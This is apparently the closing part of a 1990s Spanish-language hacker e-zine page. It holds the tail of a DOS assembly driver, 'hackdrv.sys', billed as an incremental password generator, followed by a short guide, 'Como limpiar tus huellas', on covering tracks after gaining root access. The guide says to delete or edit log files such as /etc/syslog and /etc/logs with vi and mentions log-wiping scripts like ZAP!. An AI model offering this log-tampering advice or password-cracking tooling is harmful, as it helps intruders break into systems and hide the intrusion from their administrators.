+<p><font face="Courier" size="3">at_eof:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+; the non-resident code starts here </font></p>
+
+<p><font face="Courier" size="3">initial proc near <br>
+push es </font></p>
+
+<p><font face="Courier" size="3">push cs <br>
+pop ds </font></p>
+
+<p><font face="Courier" size="3">push cs <br>
+pop es </font></p>
+
+<p><font face="Courier" size="3">mov si,offset number <br>
+mov di,offset tmpnum <br>
+cld <br>
+_again: <br>
+lodsb <br>
+cmp al,0ah <br>
+jz _nomorechars <br>
+stosb <br>
+jmp _again </font></p>
+
+<p><font face="Courier" size="3">_nomorechars: <br>
+mov si,offset msgend <br>
+mov cx,4 <br>
+repe movsb </font></p>
+
+<p><font face="Courier" size="3">mov
+ah,09&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;print
+welcome message <br>
+mov dx,offset msg1 <br>
+int 21h </font></p>
+
+<p><font face="Courier" size="3">pop es <br>
+ret <br>
+initial endp </font></p>
+
+<p><font face="Courier" size="3">init: call initial <br>
+mov ax,offset at_eof <br>
+mov es:[bx]+0eh,ax <br>
+push cs <br>
+pop ax <br>
+mov es:[bx]+010h,ax <br>
+mov cs:word ptr cmdtab,offset exit3 <br>
+jmp exit2 <br>
+&nbsp; </font></p>
+
+<p><font face="Courier" size="3">msg1&nbsp;&nbsp;&nbsp; db &quot;Incremental Password
+Generator (c)1995&quot;,0ah,0dh <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; db &quot;Written by Uncle
+Armpit&quot;,0ah,0dh,0ah,0dh <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; db &quot;Starting at word [&quot; <br>
+tmpnum&nbsp; db 10 dup (?) <br>
+msgend&nbsp; db &quot;]&quot;,0a,0d,'$' <br>
+;END hackdrv.sys <br>
+----------------------------------cut here---------------------------------- <br>
+&nbsp; </font></p>
+
+<p><font face="Courier" size="3">Como limpiar tus huellas </font></p>
+
+<p><font face="Courier" size="3">Si deseas que tu ingreso con la cuenta r00t no quede
+registrado en los LOGS de el servidor revisa los directorios buscando archivos&nbsp;
+como&nbsp; logs, syslog, log,&nbsp; o&nbsp; cualquiera&nbsp; que parezca&nbsp; que&nbsp;
+guarda un reporte&nbsp; de&nbsp; los accesos&nbsp; y borralos&nbsp; o mejor aun editalos
+usando&nbsp; el&nbsp; editor de archivos de UNIX.&nbsp; Para ejecutar el editor usa el
+comando vi </font></p>
+
+<p><font face="Courier" size="3">Edita o borra los siguientes archivos: /etc/syslog <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+/etc/log <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+/etc/logs </font></p>
+
+<p align="center"><font face="Courier" size="3">Existen algunos scripts para borrar las
+huellas como ZAP! disponibles en la red y en los proximos numeros de esta revista.</font></p>
+
+<p align="center"><font face="Courier" size="3"><br>
+&nbsp; <br>
+</font><font face="Courier" size="5">&nbsp; </font><font COLOR="#33FF33" face="Courier"
+size="5"><b>Le PompaItor</b></font><font face="Courier" size="5"> &nbsp; </font></p>
+</body>
+</html>
